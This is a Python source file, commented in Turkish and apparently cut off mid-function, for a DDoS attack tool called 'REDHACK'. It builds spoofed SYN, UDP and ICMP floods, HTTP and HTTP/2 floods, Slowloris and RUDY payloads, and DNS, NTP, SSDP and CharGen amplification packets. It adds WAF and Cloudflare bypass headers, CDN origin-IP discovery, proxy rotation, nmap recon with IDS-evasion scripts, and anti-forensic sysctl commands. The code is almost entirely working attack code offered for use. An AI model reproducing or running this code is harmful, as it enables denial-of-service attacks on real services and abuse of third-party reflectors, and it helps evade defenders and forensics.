#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# REDHACK PROJESİ - MUTLAK KUSURSUZLUK v5.0
import socket
import random
import threading
import time
import sys
import struct
import ssl
import os
import ipaddress
import nmap
import logging
import resource
import psutil
import select
import zlib
import ctypes
import subprocess
import json
import socks
import re
import dns.resolver
import h2.connection
import h2.events
import aioquic
from concurrent.futures import ThreadPoolExecutor
from collections import deque, defaultdict
from datetime import datetime
from scapy.all import IP, TCP, UDP, ICMP, Raw, send
from scapy.layers.ntp import NTP
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IPOption
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import urlparse

# --- GLOBAL KONTROLLER ---
# if not hasattr(socket, 'SO_ORIGINAL_DST'):
 #    print("[!] Çekirdek desteği eksik. Linux TPROXY gereklidir.")
  #   sys.exit(1)

if os.geteuid() != 0:
    print("[!] ROOT yetkisi gereklidir (raw socket için)")
    sys.exit(1)

# --- SİSTEM OPTİMİZASYONU ---
# Dosya tanımlayıcı limitini artır
resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
# Socket buffer boyutunu artır
sysctl_cmd = "sysctl -w net.core.wmem_max=12582912 && sysctl -w net.core.rmem_max=12582912"
subprocess.run(sysctl_cmd, shell=True, check=True)
# Kernel parametreleri optimizasyonu
sysctl_opt = "sysctl -w net.ipv4.tcp_tw_reuse=1 && sysctl -w net.ipv4.tcp_syncookies=0"
subprocess.run(sysctl_opt, shell=True, check=True)
# Anti-forensic önlemler
subprocess.run("sysctl -w kernel.core_pattern=/dev/null", shell=True, check=True)
subprocess.run("sysctl -w kernel.dmesg_restrict=1", shell=True, check=True)

# --- LOG YAPILANDIRMASI ---
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('redhack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('REDHACK')

# --- SALDIRI KONFİGÜRASYONU ---
class AttackConfig:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 0
        self.attack_duration = 600
        self.thread_count = 1000
        self.packet_per_second = 10000
        self.proxy_list = []
        self.spoofed_ips = []
        self.user_agents = []
        self.attack_type = "MIXED"
        self.ssl_enabled = True
        self.packet_size = 4096
        self.keep_alive = True
        self.amplification_factor = 500
        self.bypass_cf = True
        self.intensity = 10
        self.target_info = {}
        self.rate_limiter = RateLimiter()
        self.adaptive_mode = True
        self.encrypted_packets = False
        self.packet_compression = False
        self.tunneling_enabled = False
        self.polymorphic_packets = True
        self.detected_security = []
        self.feedback_based = True
        self.response_threshold = 0.8
        self.bandwidth_threshold = 0.9
        self.ntp_servers = []
        self.ssdp_servers = []
        self.chargen_servers = []
        self.http2_enabled = False
        self.http3_enabled = False
        self.waf_detected = False
        self.cdn_detected = False
        self.attack_stage = "RECON"
        self.stage_duration = 60
        self.vector_rotation = False
        self.ip_rotation_interval = 30
        self.last_ip_rotation = time.time()
        self.current_ip_pool = []
        self.ml_model_enabled = False
        self.attack_history = deque(maxlen=1000)

    def validate(self):
        try:
            ipaddress.ip_address(self.target_ip)
            if not (0 <= self.target_port <= 65535):
                raise ValueError("Geçersiz port aralığı")
            if not (1 <= self.intensity <= 10):
                raise ValueError("Yoğunluk 1-10 arası olmalıdır")
        except ValueError as e:
            logger.error(f"[HATA] Geçersiz konfigürasyon: {str(e)}")
            sys.exit(1)

# --- HIZ SİNİRLAYICI VE PERFORMANS YÖNETİMİ ---
class RateLimiter:
    def __init__(self):
        self.rates = defaultdict(deque)
        self.lock = threading.Lock()
        self.last_adjust = time.time()
        self.cpu_threshold = 80.0
        self.ram_threshold = 90.0
        self.bandwidth_threshold = 90.0
        self.io_threshold = 80.0
        self.network_usage = deque(maxlen=10)
        
    def get_bandwidth_usage(self):
        try:
            net_stats = psutil.net_io_counters()
            total_bytes = net_stats.bytes_sent + net_stats.bytes_recv
            time.sleep(0.1)
            net_stats_new = psutil.net_io_counters()
            total_bytes_new = net_stats_new.bytes_sent + net_stats_new.bytes_recv
            current_usage = (total_bytes_new - total_bytes) * 8 / 0.1  # bps
            self.network_usage.append(current_usage)
            return current_usage
        except Exception:
            return 0
            
    def get_io_usage(self):
        try:
            return psutil.disk_io_counters().busy_time / 1000.0
        except Exception:
            return 0
    
    def check_rate(self, attack_type, max_rate):
        with self.lock:
            now = time.time()
            
            # Kaynak kullanımını kontrol et (her 5 saniyede bir)
            if now - self.last_adjust > 5.0:
                self.adjust_for_resources()
                self.last_adjust = now
            
            # Eski kayıtları temizle
            while self.rates[attack_type] and now - self.rates[attack_type][0] > 1.0:
                self.rates[attack_type].popleft()
            
            if len(self.rates[attack_type]) < max_rate:
                self.rates[attack_type].append(now)
                return True
            return False
    
    def adjust_for_resources(self):
        cpu_percent = psutil.cpu_percent()
        ram_percent = psutil.virtual_memory().percent
        bandwidth_usage = self.get_bandwidth_usage()
        io_usage = self.get_io_usage()
        
        # CPU kullanımı çok yüksekse hızı düşür
        if cpu_percent > self.cpu_threshold:
            for attack_type in list(self.rates.keys()):
                if len(self.rates[attack_type]) > 100:
                    self.rates[attack_type] = deque(list(self.rates[attack_type])[::2])
                    logger.warning(f"CPU yüksek ({cpu_percent}%), {attack_type} hızı düşürüldü")
        
        # RAM kullanımı çok yüksekse hızı düşür
        if ram_percent > self.ram_threshold:
            for attack_type in list(self.rates.keys()):
                if len(self.rates[attack_type]) > 50:
                    self.rates[attack_type] = deque(list(self.rates[attack_type])[:len(self.rates[attack_type])//2])
                    logger.warning(f"RAM yüksek ({ram_percent}%), {attack_type} hızı düşürüldü")
        
        # Bant genişliği kullanımı yüksekse
        if bandwidth_usage > self.bandwidth_threshold:
            for attack_type in list(self.rates.keys()):
                if len(self.rates[attack_type]) > 200:
                    self.rates[attack_type] = deque(list(self.rates[attack_type])[::2])
                    logger.warning(f"Bant genişliği yüksek ({bandwidth_usage:.2f}Mbps), {attack_type} hızı düşürüldü")
        
        # Disk I/O yüksekse
        if io_usage > self.io_threshold:
            for attack_type in list(self.rates.keys()):
                if len(self.rates[attack_type]) > 150:
                    self.rates[attack_type] = deque(list(self.rates[attack_type])[:len(self.rates[attack_type])//2])
                    logger.warning(f"Disk I/O yüksek ({io_usage}%), {attack_type} hızı düşürüldü")

# --- HEDEF KEŞİF MODÜLÜ ---
class TargetScanner:
    @staticmethod
    def scan_target(ip, port=None):
        try:
            nm = nmap.PortScanner()
            scan_args = '-sS -T4 -O -sV --script=banner,firewall,ids-evasions,waf-detect --top-ports 100'
            
            if port:
                scan_args = f'-sS -T4 -O -sV --script=banner,firewall,ids-evasions,waf-detect -p {port}'
            
            logger.info(f"{ip} hedefi taranıyor...")
            start_time = time.time()
            nm.scan(ip, arguments=scan_args)
            scan_duration = time.time() - start_time
            logger.info(f"Tarama tamamlandı ({scan_duration:.2f}s)")
            
            if ip not in nm.all_hosts():
                return None
                
            info = {
                'hostname': nm[ip].hostname(),
                'state': nm[ip].state(),
                'os': nm[ip]['osmatch'][0]['name'] if 'osmatch' in nm[ip] else 'Bilinmiyor',
                'security': [],
                'protocols': {},
                'waf_detected': False,
                'cdn_detected': False
            }
            
            # Güvenlik sistemlerini tespit et
            for script in nm[ip].get('script', {}):
                if 'firewall' in script.lower() or 'ids' in script.lower() or 'waf' in script.lower():
                    info['security'].append(script)
                    if 'waf' in script.lower():
                        info['waf_detected'] = True
                if 'cdn' in script.lower():
                    info['cdn_detected'] = True
            
            for proto in nm[ip].all_protocols():
                info['protocols'][proto] = []
                for port in nm[ip][proto].keys():
                    port_info = {
                        'port': port,
                        'state': nm[ip][proto][port]['state'],
                        'service': nm[ip][proto][port]['name'],
                        'product': nm[ip][proto][port].get('product', ''),
                        'version': nm[ip][proto][port].get('version', ''),
                        'banner': nm[ip][proto][port].get('script', {}).get('banner', '')
                    }
                    info['protocols'][proto].append(port_info)
            
            # CDN tespiti için ek kontroller
            if not info['cdn_detected']:
                info['cdn_detected'] = TargetScanner.detect_cdn(ip)
            
            return info
        except Exception as e:
            logger.error(f"Tarama hatası: {str(e)}")
            return None

    @staticmethod
    def detect_cdn(ip):
        try:
            # SSL sertifikası kontrolü
            context = ssl.create_default_context()
            with socket.create_connection((ip, 443), timeout=3) as sock:
                with context.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert()
                    issuer = dict(x[0] for x in cert['issuer'])
                    if any(cdn in issuer.get('organizationName', '').lower() 
                           for cdn in ['cloudflare', 'akamai', 'cloudfront', 'fastly']):
                        return True
            
            # DNS kayıt kontrolü
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(ip, 'PTR')
            for rdata in answers:
                if any(cdn in rdata.to_text().lower() 
                       for cdn in ['cloudflare', 'akamai', 'cloudfront', 'fastly']):
                    return True
                    
            return False
        except Exception:
            return False

# --- WAF/CDN ATLATMA MODÜLÜ ---
class WafBypasser:
    @staticmethod
    def bypass_waf(packet, config):
        """WAF atlatma tekniklerini uygular"""
        # HTTP ise atlatma tekniklerini uygula
        if b'HTTP' in packet[:10]:
            # Rastgele HTTP method ekle
            methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH", "TRACE", "CONNECT"]
            method = random.choice(methods)
            packet = packet.replace(b'GET', method.encode(), 1)
            
            # Parametre kirliliği ekle
            if b'?' in packet:
                packet = packet.replace(b'?', b'?;~!@$%^&*()_+-='.encode(), 1)
            
            # Rastgele başlık ekle
            headers = [
                b"X-Forwarded-For: " + random.choice(config.spoofed_ips).encode(),
                b"X-Real-IP: " + random.choice(config.spoofed_ips).encode(),
                b"X-Client-IP: " + random.choice(config.spoofed_ips).encode(),
                b"X-Remote-IP: " + random.choice(config.spoofed_ips).encode(),
                b"X-Originating-IP: " + random.choice(config.spoofed_ips).encode(),
                b"X-Remote-Addr: " + random.choice(config.spoofed_ips).encode(),
                b"X-Request-URI: /" + os.urandom(5).hex().encode(),
                b"X-Request-ID: " + os.urandom(8).hex().encode(),
                b"X-Custom-Header: " + os.urandom(12).hex().encode()
            ]
            for header in headers:
                insert_pos = packet.find(b'\r\n\r\n')
                if insert_pos != -1:
                    packet = packet[:insert_pos] + b'\r\n' + header + packet[insert_pos:]
        
        return packet

    @staticmethod
    def bypass_cdn(config):
        """CDN atlatma - gerçek sunucuyu bul"""
        if not config.cdn_detected:
            return config.target_ip
            
        try:
            # DNS kayıtlarını kontrol et
            resolver = dns.resolver.Resolver()
            
            # A kayıtları
            try:
                answers = resolver.resolve(config.target_ip, 'A')
                for rdata in answers:
                    if rdata.address != config.target_ip:
                        logger.info(f"CDN arkasındaki gerçek IP bulundu: {rdata.address}")
                        return rdata.address
            except:
                pass
            
            # PTR kayıtları
            try:
                answers = resolver.resolve(dns.reversename.from_address(config.target_ip), 'PTR')
                for rdata in answers:
                    if 'cdn' not in rdata.to_text().lower() and 'cloud' not in rdata.to_text().lower():
                        # PTR'den IP'yi çöz
                        try:
                            a_records = resolver.resolve(rdata.to_text(), 'A')
                            for a in a_records:
                                logger.info(f"CDN arkasındaki gerçek IP bulundu: {a.address}")
                                return a.address
                        except:
                            pass
            except:
                pass
            
            # SSL sertifikası incelemesi
            context = ssl.create_default_context()
            with socket.create_connection((config.target_ip, 443), timeout=3) as sock:
                with context.wrap_socket(sock, server_hostname=config.target_ip) as ssock:
                    cert = ssock.getpeercert()
                    # Subject Alternative Names kontrolü
                    for san in cert.get('subjectAltName', []):
                        if san[0] == 'DNS' and san[1] != config.target_ip:
                            try:
                                a_records = resolver.resolve(san[1], 'A')
                                for a in a_records:
                                    if a.address != config.target_ip:
                                        logger.info(f"CDN arkasındaki gerçek IP bulundu: {a.address}")
                                        return a.address
                            except:
                                pass
            
            logger.warning("Gerçek IP bulunamadı, CDN hedeflenmeye devam ediliyor")
            return config.target_ip
        except Exception as e:
            logger.error(f"CDN atlatma hatası: {str(e)}")
            return config.target_ip

# --- PAKET ÜRETİM MOTORU ---
class PacketEngine:
    # XOR tabanlı basit şifreleme
    @staticmethod
    def encrypt_packet(packet, key=0xAA):
        return bytes([b ^ key for b in packet])
    
    # Paket sıkıştırma
    @staticmethod
    def compress_packet(packet):
        return zlib.compress(packet)
    
    # Paket şifreleme ve sıkıştırma
    @staticmethod
    def secure_packet(packet, config):
        if config.encrypted_packets:
            packet = PacketEngine.encrypt_packet(packet)
        if config.packet_compression:
            packet = PacketEngine.compress_packet(packet)
        return packet

    # TCP SYN Paketi (Polimorfik versiyon)
    @staticmethod
    def syn_packet(src_ip, dst_ip, dst_port, config):
        # Polimorfik varyasyonlar
        ttl = random.choice([64, 128, 255])
        window = random.choice([8192, 16384, 32768])
        options = [('MSS', 1460), ('NOP', None), ('WScale', 10)]
        random.shuffle(options)
        
        packet = IP(src=src_ip, dst=dst_ip, ttl=ttl, id=random.randint(1000, 65000)) / \
                 TCP(sport=random.randint(1024, 65535), dport=dst_port, flags="S", 
                     seq=random.randint(0, 4294967295), window=window, options=options)
        
        # Tünelleme için paket sarmalama
        if config.tunneling_enabled:
            packet = IP(src=random.choice(config.spoofed_ips), dst=random.choice(config.proxy_list).split(':')[0]) / \
                     UDP(sport=random.randint(1024, 65535), dport=int(random.choice(config.proxy_list).split(':')[1])) / \
                     Raw(load=bytes(packet))
        
        final_packet = bytes(packet)
        return PacketEngine.secure_packet(final_packet, config)

    # UDP Paketi (Polimorfik versiyon)
    @staticmethod
    def udp_packet(src_ip, dst_ip, dst_port, config, payload_size=512):
        # Polimorfik varyasyonlar
        ttl = random.choice([64, 128, 255])
        payload = os.urandom(payload_size)
        
        packet = IP(src=src_ip, dst=dst_ip, ttl=ttl, id=random.randint(1000, 65000)) / \
                 UDP(sport=random.randint(1024, 65535), dport=dst_port) / \
                 Raw(load=payload)
        
        # Tünelleme için paket sarmalama
        if config.tunneling_enabled:
            packet = IP(src=random.choice(config.spoofed_ips), dst=random.choice(config.proxy_list).split(':')[0]) / \
                     UDP(sport=random.randint(1024, 65535), dport=int(random.choice(config.proxy_list).split(':')[1])) / \
                     Raw(load=bytes(packet))
        
        final_packet = bytes(packet)
        return PacketEngine.secure_packet(final_packet, config)

    # ICMP Paketi (Polimorfik versiyon)
    @staticmethod
    def icmp_packet(src_ip, dst_ip, config, payload_size=512):
        # Polimorfik varyasyonlar
        ttl = random.choice([64, 128, 255])
        payload = os.urandom(payload_size)
        
        packet = IP(src=src_ip, dst=dst_ip, ttl=ttl, id=random.randint(1000, 65000)) / \
                 ICMP(type=8, code=0) / \
                 Raw(load=payload)
        
        # Tünelleme için paket sarmalama
        if config.tunneling_enabled:
            packet = IP(src=random.choice(config.spoofed_ips), dst=random.choice(config.proxy_list).split(':')[0]) / \
                     UDP(sport=random.randint(1024, 65535), dport=int(random.choice(config.proxy_list).split(':')[1])) / \
                     Raw(load=bytes(packet))
        
        final_packet = bytes(packet)
        return PacketEngine.secure_packet(final_packet, config)

    # HTTP Flood Paketi (Polimorfik versiyon)
    @staticmethod
    def http_flood_packet(config):
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"]
        method = random.choice(methods)
        
        # Dinamik yol oluşturma
        path = "/" + ''.join(random.choices(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.~', 
            k=random.randint(10, 50))
        )
        
        # Rastgele alt domain ekle
        if random.random() > 0.7:
            path = f"/{random.choice(['static', 'assets', 'images', 'js', 'css'])}{path}"
            
        host = config.target_ip
        
        headers = [
            f"User-Agent: {random.choice(config.user_agents)}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive" if config.keep_alive else "Connection: close",
            "Cache-Control: max-age=0, no-cache",
            "Pragma: no-cache",
            f"X-Forwarded-For: {random.choice(config.spoofed_ips)}",
            f"X-Real-IP: {random.choice(config.spoofed_ips)}",
            "Upgrade-Insecure-Requests: 1",
            f"Content-Length: {random.randint(100, 5000)}"
        ]
        
        # Cloudflare bypass
        if config.bypass_cf:
            headers.extend([
                "CF-Connecting-IP: " + random.choice(config.spoofed_ips),
                "CF-IPCountry: " + random.choice(['US', 'UK', 'DE', 'FR', 'TR']),
                "CF-Ray: " + ''.join(random.choices('0123456789ABCDEF', k=16)) + "-" + \
                random.choice(['SFO', 'LHR', 'FRA', 'CDG', 'IST'])
            ])
        
        # Rastgele ek başlıklar (polimorfik)
        for _ in range(random.randint(0, 10)):
            headers.append(f"X-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))}: " + 
                           ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 20))))
        
        # POST ise rastgele body ekle
        body = b''
        if method == "POST" and random.random() > 0.3:
            body = os.urandom(random.randint(100, 2000))
            headers.append(f"Content-Type: {random.choice(['application/json', 'application/x-www-form-urlencoded', 'multipart/form-data'])}")
        
        # Rastgele HTTP versiyonu
        http_version = random.choice(["HTTP/1.0", "HTTP/1.1", "HTTP/2"])
        
        payload = (f"{method} {path} {http_version}\r\n"
                   f"Host: {host}\r\n"
                   + "\r\n".join(headers) + "\r\n\r\n").encode() + body
        
        # WAF atlatma
        if config.waf_detected:
            payload = WafBypasser.bypass_waf(payload, config)
        
        # Tünelleme için paket sarmalama
        if config.tunneling_enabled:
            tunnel_payload = json.dumps({
                'target': f"{config.target_ip}:{config.target_port}",
                'payload': payload.decode('latin1')
            }).encode()
            payload = tunnel_payload
        
        return payload

    # HTTP/2 Flood Paketi
    @staticmethod
    def http2_flood_packet(config):
        # HTTP/2 bağlantısı için özel paket oluştur
        conn = h2.connection.H2Connection()
        headers = [
            (':method', 'GET'),
            (':path', '/' + os.urandom(5).hex()),
            (':authority', config.target_ip),
            (':scheme', 'https'),
            ('user-agent', random.choice(config.user_agents)),
            ('accept', '*/*'),
            ('x-forwarded-for', random.choice(config.spoofed_ips))
        ]
        
        # Stream ID oluştur
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, headers)
        
        # WAF atlatma için rastgele başlık ekle
        if config.waf_detected:
            conn.send_headers(stream_id, [
                (f'x-custom-{os.urandom(3).hex()}', os.urandom(8).hex())
            ])
        
        return conn.data_to_send()

    # Slowloris Paketi
    @staticmethod
    def slowloris_packet(config):
        headers = [
            f"GET /{os.urandom(6).hex()} HTTP/1.1",
            f"Host: {config.target_ip}",
            f"User-Agent: {random.choice(config.user_agents)}",
            f"X-Forwarded-For: {random.choice(config.spoofed_ips)}",
            "Content-Length: 100000",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive"
        ]
        
        # Eksik başlık sonu
        return "\r\n".join(headers).encode()

    # RUDY (R-U-Dead-Yet) Paketi
    @staticmethod
    def rudy_packet(config):
        headers = [
            f"POST /{os.urandom(6).hex()} HTTP/1.1",
            f"Host: {config.target_ip}",
            f"User-Agent: {random.choice(config.user_agents)}",
            f"X-Forwarded-For: {random.choice(config.spoofed_ips)}",
            "Content-Type: application/x-www-form-urlencoded",
            "Content-Length: 1000000",
            "Connection: keep-alive"
        ]
        
        # Yavaş gönderilecek body başlangıcı
        return "\r\n".join(headers).encode() + b"\r\n\r\n" + b"data="

    # DNS Amplifikasyon Paketi
    @staticmethod
    def dns_amplification_packet(target_ip, amplification_factor=500):
        # DNS Query ID
        transaction_id = os.urandom(2)
        
        # DNS Header (Standard query + Recursion desired)
        flags = 0x0100.to_bytes(2, 'big')
        
        # Questions = 1, Answer RRs = 0, Authority RRs = 0, Additional RRs = 0
        qdcount = 1
        ancount = 0
        nscount = 0
        arcount = 0
        
        header = transaction_id + flags + qdcount.to_bytes(2, 'big') + ancount.to_bytes(2, 'big') + nscount.to_bytes(2, 'big') + arcount.to_bytes(2, 'big')
        
        # Query for large response domains
        domains = [
            b'\x07example\x03com\x00',  # example.com
            b'\x06google\x03com\x00',   # google.com
            b'\x03isc\x03org\x00',       # isc.org
            b'\x04ripe\x03net\x00',      # ripe.net
            b'\x04test\x07largedns\x03org\x00'  # test.largedns.org
        ]
        qname = random.choice(domains)
        qtype = 0x00ff.to_bytes(2, 'big')  # ANY type
        qclass = 0x0001.to_bytes(2, 'big')  # IN class
        
        return header + qname + qtype + qclass

    # NTP Amplifikasyon Paketi
    @staticmethod
    def ntp_amplification_packet():
        return b'\x17\x00\x03\x2a' + b'\x00' * 4  # MON_GETLIST request

    # SSDP Amplifikasyon Paketi
    @staticmethod
    def ssdp_amplification_packet(target_ip):
        return (f"M-SEARCH * HTTP/1.1\r\n"
                f"Host: {target_ip}:1900\r\n"
                "MAN: \"ssdp:discover\"\r\n"
                "MX: 2\r\n"
                "ST: ssdp:all\r\n"
                f"User-Agent: {random.choice(['Linux', 'Windows', 'Mac', 'iOS', 'Android'])} UPnP/1.1\r\n\r\n").encode()

    # CharGen Amplifikasyon Paketi
    @staticmethod
    def chargen_amplification_packet():
        return b'\x00\x01\x00\x02\x00\x03'  # Rastgele karakterler

    # Checksum hesaplama
    @staticmethod
    def calculate_checksum(data):
        if len(data) % 2 != 0:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += checksum >> 16
        return ~checksum & 0xffff

# --- IP ROTASYON YÖNETİMİ ---
class IPManager:
    def __init__(self, config):
        self.config = config
        self.proxy_apis = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5"
        ]
        self.last_update = 0
        self.update_interval = 300  # 5 dakika
        
    def update_proxies(self):
        if time.time() - self.last_update < self.update_interval:
            return
            
        try:
            import requests
            new_proxies = []
            for api in self.proxy_apis:
                try:
                    response = requests.get(api, timeout=10)
                    if response.status_code == 200:
                        proxies = response.text.strip().split('\r\n')
                        new_proxies.extend(proxies)
                except:
                    continue
            
            if new_proxies:
                self.config.proxy_list = list(set(new_proxies))
                logger.info(f"{len(self.config.proxy_list)} yeni proxy güncellendi")
                self.last_update = time.time()
        except ImportError:
            logger.warning("Proxy güncelleme için requests kütüphanesi gerekli")
        except Exception as e:
            logger.error(f"Proxy güncelleme hatası: {str(e)}")

    def rotate_ips(self):
        """IP havuzunu döndür"""
        if time.time() - self.config.last_ip_rotation > self.config.ip_rotation_interval:
            self.update_proxies()
            self.config.current_ip_pool = random.sample(self.config.proxy_list, min(100, len(self.config.proxy_list)))
            self.config.last_ip_rotation = time.time()
            logger.info("IP havuzu başarıyla döndürüldü")

# --- SALDIRI MOTORU ---
class AttackCore:
    def __init__(self, config):
        self.config = config
        self.running = True
        self.stats = {
            'total_packets': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time(),
            'last_report': time.time(),
            'response_rate': 0.0,
            'error_rate': 0.0,
            'stage': 'RECON'
        }
        self.lock = threading.Lock()
        self.sockets = {}
        self.connection_pools = defaultdict(list)
        self.response_monitor = ResponseMonitor(config, self)
        self.ip_manager = IPManager(config)
        self.waf_bypasser = WafBypasser()
        self.stage_start = time.time()
        
        # Kaynakları yükle
        self._load_resources()
        
        # Hedef tarama
        self.scan_thread = threading.Thread(target=self._perform_scan, daemon=True)
        self.scan_thread.start()
        
        # Dinamik ayarlar
        self._adjust_parameters()
        
        # Yanıt izleme başlat
        self.response_monitor.start()

    def _load_resources(self):
        # IP spoof listesi (50,000 IP)
        self.config.spoofed_ips = [
            f"{random.randint(1,255)}.{random.randint(1,255)}." + 
            f"{random.randint(1,255)}.{random.randint(1,255)}" 
            for _ in range(50000)
        ]
        
        # User-Agent listesi (built-in)
        self.config.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
            "Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
        ]
        
        # Ek user-agent'lar dosyadan yükle
        try:
            with open("user_agents.txt", "r") as f:
                self.config.user_agents.extend([line.strip() for line in f if line.strip()])
        except IOError as e:
            logger.debug(f"User-Agent dosyası okunamadı: {str(e)}")
        
        # DNS sunucuları (built-in)
        self.dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", 
            "9.9.9.9", "149.112.112.112", "208.67.222.222", 
            "208.67.220.220", "64.6.64.6", "64.6.65.6"
        ]
        
        # Ek DNS sunucuları dosyadan yükle
        try:
            with open("dns_servers.txt", "r") as f:
                self.dns_servers.extend([line.strip() for line in f if line.strip()])
        except IOError as e:
            logger.debug(f"DNS sunucu listesi okunamadı: {str(e)}")
            
        # NTP sunucuları yükle
        try:
            with open("ntp_servers.txt", "r") as f:
                self.config.ntp_servers = [line.strip() for line in f if line.strip()]
                logger.info(f"{len(self.config.ntp_servers)} NTP sunucusu yüklendi")
        except IOError:
            logger.warning("NTP sunucu listesi bulunamadı")
            
        # SSDP sunucuları yükle
        try:
            with open("ssdp_servers.txt", "r") as f:
                self.config.ssdp_servers = [line.strip() for line in f if line.strip()]
                logger.info(f"{len(self.config.ssdp_servers)} SSDP sunucusu yüklendi")
        except IOError:
            logger.warning("SSDP sunucu listesi bulunamadı")
            
        # CharGen sunucuları yükle
        try:
            with open("chargen_servers.txt", "r") as f:
                self.config.chargen_servers = [line.strip() for line in f if line.strip()]
                logger.info(f"{len(self.config.chargen_servers)} CharGen sunucusu yüklendi")
        except IOError:
            logger.warning("CharGen sunucu listesi bulunamadı")

    def _perform_scan(self):
        """Hedef taramayı arka planda gerçekleştir"""
        self.config.target_info = TargetScanner.scan_target(
            self.config.target_ip, 
            self.config.target_port
        )
        if self.config.target_info:
            logger.info(f"Hedef bilgileri: {self.config.target_info}")
            
            # Güvenlik sistemlerini kaydet
            self.config.detected_security = self.config.target_info.get('security', [])
            self.config.waf_detected = self.config.target_info.get('waf_detected', False)
            self.config.cdn_detected = self.config.target_info.get('cdn_detected', False)
            
            if self.config.detected_security:
                logger.warning(f"Tespit edilen güvenlik sistemleri: {', '.join(self.config.detected_security)}")
            
            # CDN atlatma
            if self.config.cdn_detected:
                self.config.target_ip = WafBypasser.bypass_cdn(self.config)
                logger.info(f"CDN atlatıldı, yeni hedef: {self.config.target_ip}")
            
            # Tarama sonuçlarına göre saldırıyı optimize et
            self._optimize_attack()

    def _optimize_attack(self):
        """Hedef bilgilerine göre saldırı parametrelerini optimize et"""
        if not self.config.target_info:
            return
            
        # Güvenlik sistemi tespit edilirse
        if self.config.detected_security:
            logger.info("Güvenlik sistemi tespit edildi, polimorfik paketler ve tünelleme etkinleştirildi")
            self.config.polymorphic_packets = True
            self.config.tunneling_enabled = True
            self.config.encrypted_packets = True
            
        # HTTP servisi varsa HTTP flood'a ağırlık ver
        if any(s['service'] == 'http' for s in self.config.target_info['protocols'].get('tcp', [])):
            if self.config.attack_type == "MIXED":
                logger.info("Hedef HTTP servisi tespit edildi, HTTP flood ağırlıklı saldırı")
                self.config.packet_per_second = int(self.config.packet_per_second * 1.5)
        
        # DNS servisi varsa DNS amplifikasyonu kullan
        if any(s['service'] == 'domain' for s in self.config.target_info['protocols'].get('udp', [])):
            if self.config.attack_type == "MIXED":
                logger.info("Hedef DNS servisi tespit edildi, DNS amplifikasyonu etkinleştirildi")
                self.config.amplification_factor = 1000

    def _adjust_parameters(self):
        """Yoğunluk ayarlarına göre parametreleri ayarla"""
        # Yoğunluk katsayısı (1-10 arası)
        intensity_factor = self.config.intensity / 5.0
        
        # Paket hızını ve thread sayısını yoğunluğa göre ayarla
        self.config.packet_per_second = int(self.config.packet_per_second * intensity_factor)
        self.config.thread_count = min(20000, max(500, int(self.config.thread_count * intensity_factor)))
        
        # Uyarlamalı mod için ek ayarlar
        if self.config.adaptive_mode:
            # CPU çekirdek sayısına göre thread ayarla
            cpu_count = os.cpu_count() or 1
            self.config.thread_count = min(
                self.config.thread_count, 
                cpu_count * 500
            )
            logger.info(f"Uyarlamalı mod: {cpu_count} çekirdek için {self.config.thread_count} thread")

    def _update_stats(self, success=True):
        """İstatistikleri güncelle ve performansı izle"""
        with self.lock:
            self.stats['total_packets'] += 1
            if success:
                self.stats['successful'] += 1
            else:
                self.stats['failed'] += 1
            
            now = time.time()
            elapsed = now - self.stats['last_report']
            
            # Her saniye raporla
            if elapsed >= 1.0:
                pps = self.stats['total_packets'] / elapsed
                success_rate = (self.stats['successful'] / self.stats['total_packets']) * 100 if self.stats['total_packets'] > 0 else 0
                total_elapsed = now - self.stats['start_time']
                
                logger.info(
                    f"[STAT] Paket/sn: {pps:.0f} | Başarı: {success_rate:.1f}% | "
                    f"Yanıt Oranı: {self.stats['response_rate']:.2f} | "
                    f"Aşama: {self.config.attack_stage} | "
                    f"Toplam: {self.stats['total_packets']} | Süre: {total_elapsed:.0f}s"
                )
                
                # Sıfırla
                self.stats['total_packets'] = 0
                self.stats['successful'] = 0
                self.stats['failed'] = 0
                self.stats['last_report'] = now

    def _get_socket(self, proto):
        """Protokole özel socket oluştur veya önbellekten getir"""
        if proto not in self.sockets:
            if proto == socket.IPPROTO_TCP:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
